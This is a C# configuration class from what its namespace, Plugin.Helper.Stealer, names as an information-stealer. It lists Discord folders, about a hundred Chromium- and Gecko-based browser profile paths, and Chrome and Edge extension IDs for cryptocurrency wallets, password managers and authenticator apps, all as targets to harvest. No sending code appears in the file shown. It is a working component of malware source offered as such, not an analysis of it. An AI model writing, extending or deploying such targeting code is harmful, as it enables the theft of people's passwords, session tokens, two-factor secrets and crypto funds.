

using System;
using System.Collections.Generic;


namespace Plugin.Helper.Stealer
{
	public static class Configuration
	{
		public static readonly string commonAppdata = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
		public static readonly string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		public static readonly string roamingAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		public static string _programFiles = (string) null;
		public static readonly string programFilesX86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
		public static string[] DiscordPaths = new string[5]
		{
			Configuration.roamingAppData + "\\Discord",
			Configuration.roamingAppData + "\\DiscordCanary",
			Configuration.roamingAppData + "\\DiscordPTB",
			Configuration.roamingAppData + "\\DiscordDevelopment",
			Configuration.roamingAppData + "\\Lightcord"
		};
		public static Dictionary<string, string> ChromiumBrowsers = new Dictionary<string, string>()
		{
			{
				"Google Chrome",
				Configuration.localAppData + "\\Google\\Chrome\\User Data"
			},
			{
				"Google Chrome Beta",
				Configuration.localAppData + "\\Google\\Chrome Beta\\User Data"
			},
			{
				"Google Chrome SxS",
				Configuration.localAppData + "\\Google\\Chrome SxS\\User Data"
			},
			{
				"Google Chrome Dev",
				Configuration.localAppData + "\\Google\\Chrome Dev\\User Data"
			},
			{
				"Google Chrome Unstable",
				Configuration.localAppData + "\\Google\\Chrome Unstable\\User Data"
			},
			{
				"Google Chrome Canary",
				Configuration.localAppData + "\\Google\\Chrome Canary\\User Data"
			},
			{
				"Google Chrome (x86)",
				Configuration.localAppData + "\\Google(x86)\\Chrome\\User Data"
			},
			{
				"Google Chrome Beta (x86)",
				Configuration.localAppData + "\\Google(x86)\\Chrome Beta\\User Data"
			},
			{
				"Google Chrome SxS (x86)",
				Configuration.localAppData + "\\Google(x86)\\Chrome SxS\\User Data"
			},
			{
				"Google Chrome Dev (x86)",
				Configuration.localAppData + "\\Google(x86)\\Chrome Dev\\User Data"
			},
			{
				"Google Chrome Unstable (x86)",
				Configuration.localAppData + "\\Google(x86)\\Chrome Unstable\\User Data"
			},
			{
				"Google Chrome Canary (x86)",
				Configuration.localAppData + "\\Google(x86)\\Chrome Canary\\User Data"
			},
			{
				"Chromium",
				Configuration.localAppData + "\\Chromium\\User Data"
			},
			{
				"Microsoft Edge",
				Configuration.localAppData + "\\Microsoft\\Edge\\User Data"
			},
			{
				"Brave Browser",
				Configuration.localAppData + "\\BraveSoftware\\Brave-Browser\\User Data"
			},
			{
				"Epic Privacy Browser",
				Configuration.localAppData + "\\Epic Privacy Browser\\User Data"
			},
			{
				"Amigo",
				Configuration.localAppData + "\\Amigo\\User Data"
			},
			{
				"Vivaldi",
				Configuration.localAppData + "\\Vivaldi\\User Data"
			},
			{
				"Kometa",
				Configuration.localAppData + "\\Kometa\\User Data"
			},
			{
				"Orbitum",
				Configuration.localAppData + "\\Orbitum\\User Data"
			},
			{
				"Mail.Ru Atom",
				Configuration.localAppData + "\\Mail.Ru\\Atom\\User Data"
			},
			{
				"Comodo Dragon",
				Configuration.localAppData + "\\Comodo\\Dragon\\User Data"
			},
			{
				"Torch",
				Configuration.localAppData + "\\Torch\\User Data"
			},
			{
				"Comodo",
				Configuration.localAppData + "\\Comodo\\User Data"
			},
			{
				"360ChromeX",
				Configuration.localAppData + "\\360ChromeX\\Chrome\\User Data"
			},
			{
				"Slimjet",
				Configuration.localAppData + "\\Slimjet\\User Data"
			},
			{
				"360Browser",
				Configuration.localAppData + "\\360Chrome\\Chrome\\User Data"
			},
			{
				"360Browser SE6",
				Configuration.roamingAppData + "\\360se6\\User Data"
			},
			{
				"360Browser SE",
				Configuration.roamingAppData + "\\360se\\User Data"
			},
			{
				"360 Secure Browser",
				Configuration.localAppData + "\\360Browser\\Browser\\User Data"
			},
			{
				"Maxthon3",
				Configuration.localAppData + "\\Maxthon3\\User Data"
			},
			{
				"Maxthon5",
				Configuration.roamingAppData + "\\Maxthon5\\Users"
			},
			{
				"Maxthon",
				Configuration.localAppData + "\\Maxthon\\User Data"
			},
			{
				"QQBrowser",
				Configuration.localAppData + "\\Tencent\\QQBrowser\\User Data"
			},
			{
				"K-Meleon",
				Configuration.localAppData + "\\K-Melon\\User Data"
			},
			{
				"Xpom",
				Configuration.localAppData + "\\Xpom\\User Data"
			},
			{
				"Lenovo Browser",
				Configuration.localAppData + "\\Lenovo\\SLBrowser"
			},
			{
				"Xvast",
				Configuration.localAppData + "\\Xvast\\User Data"
			},
			{
				"Go!",
				Configuration.localAppData + "\\Go!\\User Data"
			},
			{
				"Safer Secure Browser",
				Configuration.localAppData + "\\Safer Technologies\\Secure Browser\\User Data"
			},
			{
				"Sputnik",
				Configuration.localAppData + "\\Sputnik\\Sputnik\\User Data"
			},
			{
				"Nichrome",
				Configuration.localAppData + "\\Nichrome\\User Data"
			},
			{
				"CocCoc Browser",
				Configuration.localAppData + "\\CocCoc\\Browser\\User Data"
			},
			{
				"Uran",
				Configuration.localAppData + "\\uCozMedia\\Uran\\User Data"
			},
			{
				"Chromodo",
				Configuration.localAppData + "\\Chromodo\\User Data"
			},
			{
				"Yandex Browser",
				Configuration.localAppData + "\\Yandex\\YandexBrowser\\User Data"
			},
			{
				"Yandex Browser Canary",
				Configuration.localAppData + "\\Yandex\\YandexBrowserCanary\\User Data"
			},
			{
				"Yandex Browser Dev",
				Configuration.localAppData + "\\Yandex\\YandexBrowserDeveloper\\User Data"
			},
			{
				"Yandex Browser Beta",
				Configuration.localAppData + "\\Yandex\\YandexBrowserBeta\\User Data"
			},
			{
				"Yandex Browser Tech",
				Configuration.localAppData + "\\Yandex\\YandexBrowserTech\\User Data"
			},
			{
				"Yandex Browser SxS",
				Configuration.localAppData + "\\Yandex\\YandexBrowserSxS\\User Data"
			},
			{
				"7Star",
				Configuration.localAppData + "\\7Star\\7Star\\User Data"
			},
			{
				"Chedot",
				Configuration.localAppData + "\\Chedot\\User Data"
			},
			{
				"CentBrowser",
				Configuration.localAppData + "\\CentBrowser\\User Data"
			},
			{
				"Iridium",
				Configuration.localAppData + "\\Iridium\\User Data"
			},
			{
				"Opera Stable",
				Configuration.roamingAppData + "\\Opera Software\\Opera Stable"
			},
			{
				"Opera Neon",
				Configuration.roamingAppData + "\\Opera Software\\Opera Neon\\User Data"
			},
			{
				"Opera Crypto Developer",
				Configuration.roamingAppData + "\\Opera Software\\Opera Crypto Developer"
			},
			{
				"Opera GX",
				Configuration.roamingAppData + "\\Opera Software\\Opera GX Stable"
			},
			{
				"Elements Browser",
				Configuration.localAppData + "\\Elements Browser\\User Data"
			},
			{
				"Citrio",
				Configuration.localAppData + "\\CatalinaGroup\\Citrio\\User Data"
			},
			{
				"Sleipnir5 ChromiumViewer",
				Configuration.localAppData + "\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer"
			},
			{
				"QIP Surf",
				Configuration.localAppData + "\\QIP Surf\\User Data"
			},
			{
				"Liebao",
				Configuration.localAppData + "\\liebao\\User Data"
			},
			{
				"Coowon",
				Configuration.localAppData + "\\Coowon\\Coowon\\User Data"
			},
			{
				"ChromePlus",
				Configuration.localAppData + "\\MapleStudio\\ChromePlus\\User Data"
			},
			{
				"Rafotech Mustang",
				Configuration.localAppData + "\\Rafotech\\Mustang\\User Data"
			},
			{
				"Suhba",
				Configuration.localAppData + "\\Suhba\\User Data"
			},
			{
				"TorBro",
				Configuration.localAppData + "\\TorBro\\Profile"
			},
			{
				"RockMelt",
				Configuration.localAppData + "\\RockMelt\\User Data"
			},
			{
				"Bromium",
				Configuration.localAppData + "\\Bromium\\User Data"
			},
			{
				"Twinkstar",
				Configuration.localAppData + "\\Twinkstar\\User Data"
			},
			{
				"iTop Private Browser",
				Configuration.localAppData + "\\iTop Private Browser\\User Data"
			},
			{
				"CCleaner Browser",
				Configuration.localAppData + "\\CCleaner Browser\\User Data"
			},
			{
				"AcWebBrowser",
				Configuration.localAppData + "\\AcWebBrowser\\User Data"
			},
			{
				"CoolNovo",
				Configuration.localAppData + "\\CoolNovo\\User Data"
			},
			{
				"Baidu Spark",
				Configuration.localAppData + "\\Baidu Spark\\User Data"
			},
			{
				"SRWare Iron",
				Configuration.localAppData + "\\SRWare Iron\\User Data"
			},
			{
				"Titan Browser",
				Configuration.localAppData + "\\Titan Browser\\User Data"
			},
			{
				"AVAST Browser",
				Configuration.localAppData + "\\AVAST Software\\Browser\\User Data"
			},
			{
				"AVG Browser",
				Configuration.localAppData + "\\AVG\\Browser\\User Data"
			},
			{
				"UCBrowser",
				Configuration.localAppData + "\\UCBrowser\\User Data_i18n"
			},
			{
				"URBrowser",
				Configuration.localAppData + "\\UR Browser\\User Data"
			},
			{
				"Blisk",
				Configuration.localAppData + "\\Blisk\\User Data"
			},
			{
				"Flock",
				Configuration.localAppData + "\\Flock\\User Data"
			},
			{
				"CryptoTab Browser",
				Configuration.localAppData + "\\CryptoTab Browser\\User Data"
			},
			{
				"Sidekick",
				Configuration.localAppData + "\\Sidekick\\User Data"
			},
			{
				"SwingBrowser",
				Configuration.localAppData + "\\SwingBrowser\\User Data"
			},
			{
				"Superbird",
				Configuration.localAppData + "\\Superbird\\User Data"
			},
			{
				"SalamWeb",
				Configuration.localAppData + "\\SalamWeb\\User Data"
			},
			{
				"GhostBrowser",
				Configuration.localAppData + "\\GhostBrowser\\User Data"
			},
			{
				"NetboxBrowser",
				Configuration.localAppData + "\\NetboxBrowser\\User Data"
			},
			{
				"GarenaPlus",
				Configuration.localAppData + "\\GarenaPlus\\User Data"
			},
			{
				"Kinza",
				Configuration.localAppData + "\\Kinza\\User Data"
			},
			{
				"InsomniacBrowser",
				Configuration.localAppData + "\\InsomniacBrowser\\User Data"
			},
			{
				"ViaSat Browser",
				Configuration.localAppData + "\\ViaSat\\Viasat Browser\\User Data"
			},
			{
				"Naver Whale",
				Configuration.localAppData + "\\Naver\\Naver Whale\\User Data"
			},
			{
				"Falkon",
				Configuration.localAppData + "\\falkon\\profiles"
			},
			{
				"Sogou",
				Configuration.roamingAppData + "\\SogouExplorer\\Webkit"
			}
		};
		public static Dictionary<string, string> GeckoBrowsers = new Dictionary<string, string>()
		{
			{
				"Firefox",
				Configuration.roamingAppData + "\\Mozilla\\Firefox\\Profiles"
			},
			{
				"SeaMonkey",
				Configuration.roamingAppData + "\\Mozilla\\SeaMonkey\\Profiles"
			},
			{
				"Waterfox",
				Configuration.roamingAppData + "\\Waterfox\\Profiles"
			},
			{
				"Waterfox Classic",
				Configuration.roamingAppData + "\\Waterfox\\Profiles"
			},
			{
				"K-Meleon",
				Configuration.roamingAppData + "\\K-Meleon\\Profiles"
			},
			{
				"Thunderbird",
				Configuration.roamingAppData + "\\Thunderbird\\Profiles"
			},
			{
				"IceDragon",
				Configuration.roamingAppData + "\\Comodo\\IceDragon\\Profiles"
			},
			{
				"Cyberfox",
				Configuration.roamingAppData + "\\8pecxstudios\\Cyberfox\\Profiles"
			},
			{
				"BlackHawk",
				Configuration.roamingAppData + "\\NETGATE Technologies\\BlackHawk\\Profiles"
			},
			{
				"Pale Moon",
				Configuration.roamingAppData + "\\Moonchild Productions\\Pale Moon\\Profiles"
			},
			{
				"Basilisk",
				Configuration.roamingAppData + "\\Moonchild Productions\\Basilisk\\Profiles"
			},
			{
				"BitTube",
				Configuration.roamingAppData + "\\BitTube\\BitTubeBrowser\\Profiles"
			},
			{
				"SlimBrowser",
				Configuration.roamingAppData + "\\FlashPeak\\SlimBrowser\\Profiles"
			}
		};
		public static Dictionary<string, string> ChromiumCryptoExtensions = new Dictionary<string, string>()
		{
			{
				"SafePal",
				"lgmpcpglpngdoalbgeoldeajfclnhafa"
			},
			{
				"Pontem Aptos Wallet",
				"phkbamefinggmakgklpkljjmgibohnba"
			},
			{
				"xverse.app",
				"idnnbdplmphpflfnlkomgpfbpcgelopg"
			},
			{
				"Rainbow",
				"opfgelmcmbiajamepnmloijbpoleiama"
			},
			{
				"LastPass",
				"hdokiejnpimakedhajhdlcegeplioahd"
			},
			{
				"Elli-Sui Wallet",
				"ocjdpmoallmgmjbbogfiiaofphbjgchh"
			},
			{
				"Opera Wallet",
				"gojhcdgcpbpfigcaejpfhfegekdgiblk"
			},
			{
				"Petra Aptos Wallet",
				"ejjladinnckdgjemekebdpeokbikhfci"
			},
			{
				"Hashpack",
				"gjagmgiddbbciopjhllkdnddhcglnemk"
			},
			{
				"zkPass TransGate",
				"afkoofjocpbclhnldmmaphappihehpma"
			},
			{
				"Blade-Hedera Web3 Digital Wallet",
				"abogmiocnneedmmepnohnhlijcjpcifd"
			},
			{
				"Leap Cosmos Wallet",
				"fcfcfllfndlomdhbehjjcoimbgofdncg"
			},
			{
				"Frontier Wallet",
				"kppfdiipphfccemcignhifpjkapfbihd"
			},
			{
				"Coinhub",
				"jgaaimajipbpdogpdglhaphldakikgef"
			},
			{
				"Klever Wallet",
				"ifclboecfhkjbpmhgehodcjpciihhmif"
			},
			{
				"Glass wallet-Sui wallet",
				"loinekcabhlmhjjbocijdoimmejangoa"
			},
			{
				"MultiversX DeFi Wallet",
				"dngmlblcodfobpdpecaadgfbcggfjfnm"
			},
			{
				"Fewcha Move Wallet",
				"ebfidpplhabeedpnhjnobghokpiioolj"
			},
			{
				"Fluvi Wallet",
				"mmmjbcfofconkannjonfmjjajpllddbg"
			},
			{
				"HAVAH Wallet",
				"cnncmdhjacpkmjmkcafchppbnpnhdmon"
			},
			{
				"SubWallet - Polkadot Wallet",
				"onhogfjeacnfoofkfgppdlbmlmnplgbn"
			},
			{
				"compass-wallet-for-sei",
				"anokgmphncpekkhclmingpimjmcooifb"
			},
			{
				"Rise - Aptos Wallet",
				"hbbgbephgojikajhfbomhlmmollphcad"
			},
			{
				"Morphis Wallet",
				"heefohaffomkkkphnlpohglngmbcclhi"
			},
			{
				"BitPay",
				"jkjgekcefbkpogohigkgooodolhdgcda"
			},
			{
				"Venom Wallet",
				"ojggmchlghnjlapmfbnjholfjkiidbch"
			},
			{
				"TronLink",
				"ibnejdfjmmkpcnlpebklmnkoeoihofec"
			},
			{
				"MetaMask",
				"nkbihfbeogaeaoehlefnkodbefgpgknn"
			},
			{
				"Exodus",
				"aholpfdialjgjfhomihkjbmgjidlcdno"
			},
			{
				"Trust Wallet",
				"egjidjbpglichdcondbcbdnbeeppgdph"
			},
			{
				"Braavos Smart Wallet",
				"jnlgamecbpmbajjfhmmmlhejkemejdma"
			},
			{
				"Yoroi",
				"ffnbelfdoeiohenkjibnmadjiehjhajb"
			},
			{
				"Binance Chain Wallet",
				"fhbohimaelbohpjbbldcngcnapndodjp"
			},
			{
				"Jaxx Liberty",
				"aiaifbiceejhhkfbjdgonjgljkpcdhch"
			},
			{
				"iWallet",
				"kncchdigobghenbbaddojjnnaogfppfj"
			},
			{
				"Terra Station",
				"aiifbnbfobpmeekipheeijimdpnlpgpp"
			},
			{
				"EQUAL Wallet",
				"hifafgmccdpekplomjjkcfgodnhcellj"
			},
			{
				"Wombat",
				"amkmjjmmflddogmhpjloimipbofnfjih"
			},
			{
				"Nifty Wallet",
				"jnldfbidonfeldmalbflbmlebbipcnle"
			},
			{
				"Math Wallet",
				"afbcbjpbpfadlkmhmclhkeeodmamcflc"
			},
			{
				"Guarda",
				"hpglfhgfnhbgpjdenjgmdgoeiappafln"
			},
			{
				"Coin98 Wallet",
				"aeachknmefphepccionboohckonoeemg"
			},
			{
				"TezBox",
				"mnfifefkajgofkcjkemidiaecocnkjeh"
			},
			{
				"Cyano Wallet",
				"dkdedlpgdmmkkfjabffeganieamfklkm"
			},
			{
				"BitKeep",
				"jiidiaalihmmhddjgbnbgdfflelocpak"
			},
			{
				"Coinbase Wallet",
				"hnfanknocfeofbddgcijnmhnfnkdnaad"
			},
			{
				"Phantom",
				"bfnaelmomeimhlpmgjnjophhpkkoljpa"
			},
			{
				"MOBOX WALLET",
				"fcckkdbjnoikooededlapcalpionmalo"
			},
			{
				"XDCPay",
				"bocpokimicclpaiekenaeelehdjllofo"
			},
			{
				"Solana Wallet",
				"bhhhlbepdkbapadjdnnojkbgioiodbic"
			},
			{
				"Swash",
				"cmndjbecilbocjfkibfbifhngkdmjgog"
			},
			{
				"Finnie",
				"cjmkndjhnagcfbpiemnkdpomccnjblmj"
			},
			{
				"Keplr",
				"dmkamcknogkgcdfhhbddcghachkejeap"
			},
			{
				"Liquality Wallet",
				"kpfopkelmapcoipemfendmdcghnegimn"
			},
			{
				"Rabet",
				"hgmoaheomcjnaheggkfafnjilfcefbmo"
			},
			{
				"Ronin Wallet",
				"fnjhmkhhmkbjkkabndcnnogagogbneec"
			},
			{
				"ZilPay",
				"klnaejjgbibmhlephnhpmaofohgkpgkd"
			},
			{
				"XDEFI Wallet",
				"hmeobnfnfcmdkdcmlblgagmfpfboieaf"
			},
			{
				"Waves Keeper",
				"lpilbniiabackdjcionkobglmddfbcjo"
			},
			{
				"GreenAddress",
				"gflpckpfdgcagnbdfafmibcmkadnlhpj"
			},
			{
				"Sollet",
				"fhmfendgdocmcbmfikdcogofphimnkno"
			},
			{
				"ICONex",
				"flpiciilemghbmfalicajoolhkkenfel"
			},
			{
				"MEW CX",
				"nlbmnnijcnlegkjjpcfjclmcfggfefdm"
			},
			{
				"NeoLine",
				"cphhlgmgameodnhkjdmkpanlelnlohao"
			},
			{
				"KHC",
				"hcflpincpppdclinealmandijcmnkbgn"
			},
			{
				"Byone",
				"nlgbhdfgdhgbiamfdfmbikcdghidoadd"
			},
			{
				"OneKey",
				"ilbbpajmiplgpehdikmejfemfklpkmke"
			},
			{
				"MetaWallet",
				"pfknkoocfefiocadajpngdknmkjgakdg"
			},
			{
				"Atomic Wallet",
				"bhmlbgebokamljgnceonbncdofmmkedg"
			},
			{
				"Electrum",
				"hieplnfojfccegoloniefimmbfjdgcgp"
			},
			{
				"Mycelium",
				"pidhddgciaponoajdngciiemcflpnnbg"
			},
			{
				"Coinomi",
				"blbpgcogcoohhngdjafgpoagcilicpjh"
			},
			{
				"Edge",
				"doljkehcfhidippihgakcihcmnknlphh"
			},
			{
				"BRD",
				"nbokbjkelpmlgflobbohapifnnenbjlh"
			},
			{
				"Samourai Wallet",
				"apjdnokplgcjkejimjdfjnhmjlbpgkdi"
			},
			{
				"Bread",
				"jifanbgejlbcmhbbdbnfbfnlmbomjedj"
			},
			{
				"KeepKey",
				"dojmlmceifkfgkgeejemfciibjehhdcl"
			},
			{
				"Ledger Live",
				"pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln"
			},
			{
				"Ledger Wallet",
				"hbpfjlflhnmkddbjdchbbifhllgmmhnm"
			},
			{
				"Bitbox",
				"ocmfilhakdbncmojmlbagpkjfbmeinbd"
			},
			{
				"Digital Bitbox",
				"dbhklojmlkgmpihhdooibnmidfpeaing"
			}
		};
		public static Dictionary<string, string> EdgeCryptoExtensions = new Dictionary<string, string>()
		{
			{
				"SafePal",
				"apenkfbbpmhihehmihndmmcdanacolnh"
			},
			{
				"Rainbow",
				"cpojfbodiccabbabgimdeohkkpjfpbnf"
			},
			{
				"Dashlane",
				"gehmmocbbkpblljhkekmfhjpfbkclbph"
			},
			{
				"MetaMask",
				"ejbalbakoplchlghecdalmeeeajnimhm"
			},
			{
				"Braavos Smart Wallet",
				"hkkpjehhcnhgefhbdcgfkeegglpjchdc"
			},
			{
				"Yoroi",
				"akoiaibnepcedcplijmiamnaigbepmcb"
			},
			{
				"Binance Chain Wallet",
				"mlbafbjadjidklbhgopoamemfibcpdfi"
			},
			{
				"Terra Station",
				"ajkhoeiiokighlmdnlakpjfoobnjinie"
			},
			{
				"EQUAL Wallet",
				"nggcakhlblakghejdigkaekbhicfkckn"
			},
			{
				"Wombat",
				"oemdnnhhfhdhilalibobndhoahcaiboe"
			},
			{
				"Math Wallet",
				"dfeccadlilpndjjohbjdblepmjeahlmm"
			},
			{
				"TezBox",
				"iaociiajffacjhhmleclkjdchjhdmjpb"
			},
			{
				"Keplr",
				"ocodgmmffbkkeecmadcijjhkmeohinei"
			},
			{
				"Ronin Wallet",
				"kjmoohlgokccodicjjfebfomlbljgfhk"
			},
			{
				"Waves Keeper",
				"nkaemodamjfefjgbefolnpnlccpdfpap"
			}
		};
		public static Dictionary<string, string> ChromePasswordManagerExtensions = new Dictionary<string, string>()
		{
			{
				"Keeper Password Manager",
				"bfogiafebfohielmmehodmfbbebbbpei"
			},
			{
				"RoboForm",
				"pnlccmojcmeohlpggmfnbbiapkmbliob"
			},
			{
				"MultiPassword",
				"cnlhokffphohmfcddnibpohmkdfafdli"
			},
			{
				"1Password-fox",
				"aeblfdkhhhdcdjpifhhbdiojplfjncoa"
			},
			{
				"Dashlane",
				"fdjamakpfbbddfjaooikfcpapjohcfmg"
			},
			{
				"DualSafe Password Manager",
				"lgbjhdkjmpgjgcbcdlhkokkckpjmedgc"
			},
			{
				"Trezor Password Manager",
				"imloifkgjagghnncjkhggdhalmcnfklk"
			},
			{
				"Authy",
				"gaedmjdfmmahhbjefcbgaolhhanlaolb"
			},
			{
				"Authenticator",
				"bhghoamapcdpbohphigoooaddinpkbai"
			},
			{
				"GAuth Authenticator",
				"ilgcnhelpchnceeipipijaljkblbcobl"
			},
			{
				"EOS Authenticator",
				"oeljdldpnmdbchonielidgobddffflal"
			},
			{
				"KeePassXC",
				"oboonakemofpalcgghocfoadofidjkkk"
			},
			{
				"Bitwarden",
				"nngceckbapebfimnlniiiahkandclblb"
			},
			{
				"NordPass",
				"fooolghllnmhmmndgjiamiiodkpenpbb"
			},
			{
				"Keeper",
				"bfogiafebfohielmmehodmfbbebbbpei"
			},
			{
				"LastPass",
				"hdokiejnpimakedhajhdlcegeplioahd"
			},
			{
				"BrowserPass",
				"naepdomgkenhinolocfifgehidddafch"
			},
			{
				"MYKI",
				"bmikpgodpkclnkgmnpphehdgcimmided"
			},
			{
				"Splikity",
				"jhfjfclepacoldmjmkmdlmganfaalklb"
			},
			{
				"CommonKey",
				"chgfefjpcobfbnpmiokfjjaglahmnded"
			},
			{
				"SAASPASS",
				"nhhldecdfagpbfggphklkaeiocfnaafm"
			},
			{
				"Telos Authenticator",
				"fpabdmjmldajnkijknogckkhlmbnfiog"
			},
			{
				"Zoho Vault",
				"igkpcodhieompeloncfnbekccinhapdb"
			},
			{
				"Norton Password Manager",
				"admmjipmmciaobhojoghlmleefbicajg"
			},
			{
				"Avira Password Manager",
				"caljgklbbfbcjjanaijlacgncafpegll"
			},
			{
				"Aegis Authenticator",
				"ppdjlkfkedmidmclhakfncpfdmdgmjpm"
			},
			{
				"LastPass Authenticator",
				"cfoajccjibkjhbdjnpkbananbejpkkjb"
			},
			{
				"KeePass",
				"lbfeahdfdkibininjgejjgpdafeopflb"
			},
			{
				"Duo Mobile",
				"eidlicjlkaiefdbgmdepmmicpbggmhoj"
			},
			{
				"OTP Auth",
				"bobfejfdlhnabgglompioclndjejolch"
			},
			{
				"FreeOTP",
				"elokfmmmjbadpgdjmgglocapdckdcpkn"
			}
		};
		public static Dictionary<string, string> EdgePasswordManagerExtensions = new Dictionary<string, string>()
		{
			{
				"LastPass",
				"bbcinlkgjjkejfdpemiealijmmooekmp"
			},
			{
				"Keeper Password Manager",
				"lfochlioelphaglamdcakfjemolpichk"
			},
			{
				"bitwarden",
				"jbkfoedolllekgbhcbcoahefnbanhhlh"
			},
			{
				"RoboForm",
				"ljfpcifpgbbchoddpjefaipoiigpdmag"
			},
			{
				"Authy",
				"ocglkepbibnalbgmbachknglpdipeoio"
			},
			{
				"Authenticator",
				"ocglkepbibnalbgmbachknglpdipeoio"
			},
			{
				"GAuth Authenticator",
				"ocglkepbibnalbgmbachknglpdipeoio"
			},
			{
				"1Password",
				"dppgmdbiimibapkepcbdbmkaabgiofem"
			},
			{
				"KeePassXC",
				"pdffhmdngciaglkoonimfcmckehcpafo"
			},
			{
				"Dashlane",
				"gehmmocbbkpblljhkekmfhjpfbkclbph"
			},
			{
				"MYKI",
				"nofkfblpeailgignhkbnapbephdnmbmn"
			}
		};

		public static string programFiles
		{
			get
			{
				if (Configuration._programFiles != null)
					return Configuration._programFiles;
				string str = Environment.GetEnvironmentVariable("ProgramW6432");
				if (str == null || str == "")
					str = "NonExistant";
				Configuration._programFiles = str;
				return Configuration._programFiles;
			}
		}
	}
}
